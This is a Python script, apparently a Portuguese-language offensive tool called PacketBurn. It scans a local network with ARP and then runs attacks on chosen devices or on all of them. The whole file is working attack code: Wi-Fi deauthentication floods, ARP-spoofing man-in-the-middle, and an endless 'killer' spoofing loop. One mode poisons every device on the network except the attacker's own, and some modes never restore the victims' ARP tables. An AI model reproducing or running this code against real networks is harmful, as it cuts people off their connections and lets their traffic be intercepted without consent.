from termcolor import colored

ascii_art = '''
 ██▓███   ▄▄▄       ▄████▄   ██ ▄█▀▓█████▄▄▄█████▓  ▄▄▄▄    █    ██  ██▀███   ███▄    █ 
▓██░  ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓█   ▀▓  ██▒ ▓▒▓ █████▄  ██  ▓██▒▓██ ▒ ██▒ ██ ▀█   █ 
▓██░ ██▓▒▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒███  ▒ ▓██░ ▒░▒ ██▒ ▄██▓██  ▒██░▓██ ░▄█ ▒▓██  ▀█ ██▒
▒██▄█▓▒ ▒░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄░ ▓██▓ ░ ▒ ██░█▀  ▓▓█  ░██░▒██▀▀█▄  ▓██▒  ▐▌██▒
▒██▒ ░  ░ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒████▒ ▒██▒ ░ ░ ▓█  ▀█▓▒▒█████▓ ░██▓ ▒██▒▒██░   ▓██░
▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░ ▒ ░░   ░▒▓███▀▒░▒▓▒ ▒ ▒ ░ ▒▓ ░▒▓░░ ▒░   ▒ ▒ 
░▒ ░       ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░   ░    ▒░▒   ░ ░░▒░ ░ ░   ░▒ ░ ▒░░ ░░   ░ ▒░
░░         ░   ▒   ░        ░ ░░ ░    ░    ░       ░    ░  ░░░ ░ ░   ░░   ░    ░   ░ ░ 
               ░  ░░ ░      ░  ░      ░  ░         ░         ░        ░              ░ 
                   ░                                    ░          

                                [+] By: GIT @sous4sec


'''

# Colorir o texto com o ASCII art
colored_ascii = colored(ascii_art, 'red')

# Exibir o painel colorido
print(colored_ascii)


import os
import time
import scapy.all as scapy
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
from scapy.layers.l2 import ARP, Ether
import netifaces

class NetworkScanner:
    """Classe para detectar dispositivos na rede local"""
    
    def __init__(self):
        self.interface = self.get_network_interface()
        self.gateway_ip = self.get_gateway()

    def get_network_interface(self):
        """Detecta a interface de rede conectada"""
        interfaces = netifaces.interfaces()
        for iface in interfaces:
            if netifaces.AF_INET in netifaces.ifaddresses(iface):
                return iface
        return None

    def get_gateway(self):
        """Obtém o gateway padrão"""
        gateways = netifaces.gateways()
        return gateways['default'][netifaces.AF_INET][0] if 'default' in gateways else None

    def scan_network(self):
        """Descobre dispositivos conectados à rede"""
        print(colored(f"[+] Escaneando a rede {self.gateway_ip}/24 na interface {self.interface}...", 'yellow'))
        arp_request = scapy.ARP(pdst=f"{self.gateway_ip}/24")
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_packet = broadcast / arp_request
        answered = scapy.srp(arp_packet, timeout=2, verbose=False)[0]

        devices = []
        for sent, received in answered:
            devices.append({"ip": received.psrc, "mac": received.hwsrc})
        
        return devices


class DeauthAttack:
    """Classe para executar ataques de Deautenticação"""
    
    def __init__(self, interface):
        self.interface = interface

    def send_deauth(self, target_mac, bssid, count=100):
        """Envia pacotes de Deautenticação"""
        pkt = RadioTap() / Dot11(addr1=target_mac, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
        print(colored(f"[+] Enviando {count} pacotes Deauth para {target_mac} na rede {bssid}...", 'red'))
        scapy.sendp(pkt, iface=self.interface, count=count, inter=0.1)


class ARPSpoofing:
    """Classe para executar ataques ARP Spoofing"""
    
    def __init__(self, gateway_ip):
        self.gateway_ip = gateway_ip

    def get_mac(self, ip):
        """Obtém o MAC Address de um IP"""
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff") / arp_request
        response = scapy.srp(broadcast, timeout=2, verbose=False)[0]
        return response[0][1].hwsrc if response else None

    def spoof(self, target_ip):
        """Executa o ataque ARP Spoofing"""
        target_mac = self.get_mac(target_ip)
        if not target_mac:
            print(colored(f"[-] MAC Address de {target_ip} não encontrado!", 'yellow'))
            return
        
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=self.gateway_ip)
        scapy.send(packet, verbose=False)
        print(colored(f"[+] Enviando pacotes ARP Spoofing para {target_ip}...", 'red'))

    def restore_network(self, target_ip):
        """Restaura a tabela ARP da vítima"""
        target_mac = self.get_mac(target_ip)
        gateway_mac = self.get_mac(self.gateway_ip)
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=self.gateway_ip, hwsrc=gateway_mac)
        scapy.send(packet, verbose=False, count=5)
        print(colored(f"[+] Restaurando rede para {target_ip}...", 'green'))

    def arpspoof_killer(self, target_ip, duration=30):
        """Ataque ARP Spoofing mais rápido e prejudicial"""
        print(colored(f"[+] Iniciando ARP Spoofing Killer  >>>> {target_ip} [...] ", 'yellow'))

        start_time = time.time()
        while duration is None or time.time() - start_time < duration:  # Permite loop infinito
            self.spoof(target_ip)  
            self.spoof(self.gateway_ip)  
            time.sleep(0.001)  
        print(colored("[+] Ataque ARP Spoofing Killer finalizado.", 'green'))


def display_devices(devices):
    """Exibe a lista de dispositivos conectados"""
    if not devices:
        print(colored("[-] Nenhum dispositivo encontrado.", 'yellow'))
    else:
        print(colored("\nDispositivos encontrados:", 'green'))
        for i, dev in enumerate(devices):
            print(f"{i} - IP: {dev['ip']}, MAC: {dev['mac']}")

if __name__ == "__main__":
    scanner = NetworkScanner()

    devices = scanner.scan_network()
    display_devices(devices)

    local_ip = netifaces.ifaddresses(scanner.interface).get(netifaces.AF_INET, [{}])[0].get('addr')
    local_mac = netifaces.ifaddresses(scanner.interface).get(netifaces.AF_LINK, [{}])[0].get('addr')

    while True:
        print(colored("\n1 - Atualizar lista de dispositivos", 'cyan'))
        print(colored("2 - Escolher dispositivo para atacar", 'cyan'))
        print(colored("3 - Atacar todos os dispositivos (menos o meu)", 'cyan'))
        print(colored("4 - Sair", 'cyan'))
        choice = int(input(colored("\nEscolha uma opção: ", 'yellow')))

        if choice == 1:
            devices = scanner.scan_network()
            display_devices(devices)

        elif choice == 2:
            if not devices:
                print(colored("[-] Nenhum dispositivo para atacar. Atualize a lista primeiro.", 'yellow'))
                continue

            target_choice = int(input(colored("\nEscolha um dispositivo para atacar: ", 'yellow')))
            target_ip = devices[target_choice]['ip']
            target_mac = devices[target_choice]['mac']

            print(colored("\n1 - Ataque Deauth (Wi-Fi)", 'cyan'))
            print(colored("2 - ARP Spoofing (MITM)", 'cyan'))
            print(colored("3 - ARP Spoofing Killer (Ataque Rápido e Agressivo)", 'cyan'))
            attack_type = int(input(colored("\nEscolha o tipo de ataque: ", 'yellow')))

            if attack_type == 1:
                interface = scanner.interface
                if "mon" not in interface:
                    print(colored("[-] A interface precisa estar no modo monitor! Use 'airmon-ng start wlan0'.", 'yellow'))
                    exit()
                
                bssid = input(colored("Digite o BSSID do roteador alvo: ", 'yellow'))
                deauth = DeauthAttack(interface)
                deauth.send_deauth(target_mac, bssid)

            elif attack_type == 2:
                arp = ARPSpoofing(scanner.gateway_ip)
                try:
                    while True:
                        arp.spoof(target_ip)
                        arp.spoof(scanner.gateway_ip)
                        time.sleep(0.001)
                except KeyboardInterrupt:
                    print(colored("\n[+] Interrompendo ataque e restaurando a rede...", 'green'))
                    arp.restore_network(target_ip)
            
            elif attack_type == 3:
                arp = ARPSpoofing(scanner.gateway_ip)
                arp.arpspoof_killer(target_ip, duration=None)  # Ataque por tempo indefinido

        elif choice == 3:
          
            print(colored("[+] Iniciando ataque em todos os dispositivos (exceto o seu)...", 'red'))
            arp = ARPSpoofing(scanner.gateway_ip)

            devices_to_attack = [dev for dev in devices if dev['ip'] != local_ip and dev['mac'] != local_mac]

            if not devices_to_attack:
                print(colored("[-] Nenhum dispositivo disponível para atacar.", 'yellow'))
                continue
            try:
                while True:
                    devices = scanner.scan_network()
                    for dev in devices:
                        if dev['ip'] != local_ip and dev['mac'] != local_mac:  # Ignora o dispositivo local
                            arp.spoof(dev['ip'])
                            arp.spoof(scanner.gateway_ip)
                            time.sleep(0.001)
            except KeyboardInterrupt:
                print(colored("\n[+] Interrompendo ataque e restaurando a rede...", 'green'))

        elif choice == 4:
            print(colored("[+] Saindo...", 'green'))
            break
